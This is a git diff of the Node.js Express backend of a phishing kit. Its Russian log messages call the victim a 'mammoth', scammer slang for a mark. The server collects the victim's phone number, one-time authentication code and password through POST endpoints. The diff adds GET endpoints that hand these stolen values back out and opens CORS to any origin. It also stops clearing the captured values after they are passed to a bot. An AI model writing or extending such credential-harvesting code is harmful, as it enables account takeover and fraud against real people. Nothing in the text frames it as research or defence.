@@ -16,25 +16,41 @@ const cors = require('cors');
 //     }
 //   });
 
+
 app.use(express.json());
 
-// Разрешаем CORS для всех доменов
-app.use(cors());
+app.use(cors({
+    origin: '*',
+    methods: 'GET,HEAD,PUT,PATCH,POST,DELETE',
+    credentials: true,
+    optionsSuccessStatus: 204,
+    allowedHeaders: ['Content-Type', 'Authorization'],
+}));
 
 var pn;
 var code;
 var pass;
-
 app.post('/phone', (req, res) => {
     const phone_number = req.body.phone_number;
     if (typeof phone_number !== 'undefined') {
         pn = phone_number;
         console.log(`Номер телефона мамонта: ${phone_number}`);
         res.json({ message: `Номер телефона мамонта: ${phone_number}` });
-        pn = undefined; // Обнуление переменной после отправки в бот
+        return;
     } else {
         console.log('Номер телефона мамонта неопределен.');
         res.status(400).json({ error: 'Номер телефона мамонта неопределен.' });
+        return;
+    }
+});
+
+app.get('/getPhone', (req, res) => {
+    if(pn){
+        res.send(`Номер телефона мамонта: ${pn}`);
+        return 0;
+    } else {
+        res.status(404).send('Номер телефона мамонта не найден.');
+        return 0;
     }
 });
 
@@ -44,10 +60,21 @@ app.post('/authCode', (req, res) => {
         code = value;
         console.log(`Код мамонта: ${value}`);
         res.json({ message: `Код мамонта: ${value}` });
-        code = undefined; // Обнуление переменной после отправки в бот
+        return 0;
     } else {
         console.log('Код мамонта неопределен.');
         res.status(400).json({ error: 'Код мамонта неопределен.' });
+        return 0;
+    }
+});
+
+app.get('/getCode', (req, res) => {
+    if(code){
+        res.send(`Код мамонта:\n${code}`);
+        return 0;
+    } else {
+        res.status(404).send('Код мамонта не найден.');
+        return 0;
     }
 });
 
@@ -57,10 +84,21 @@ app.post('/password', (req, res) => {
         pass = password;
         console.log(`Пароль мамонта: ${password}`);
         res.json({ message: `Пароль мамонта: ${password}` });
-        pass = undefined; // Обнуление переменной после отправки в бот
+        return;
     } else {
         console.log('Пароль мамонта неопределен.');
         res.status(400).json({ error: 'Пароль мамонта неопределен.' });
+        return;
+    }
+});
+
+app.get('/getPassword', (req, res) => {
+    if(pass){
+        res.send(`Пароль мамонта: ${pass}`);
+        return;
+    } else {
+        res.status(404).send('Пароль мамонта не найден.');
+        return;
     }
 });
 
@@ -71,4 +109,3 @@ app.get('/', (req, res) => {
 app.listen(port, () => {
     console.log(`Сервер запущен на порту ${port}`);
 });
-
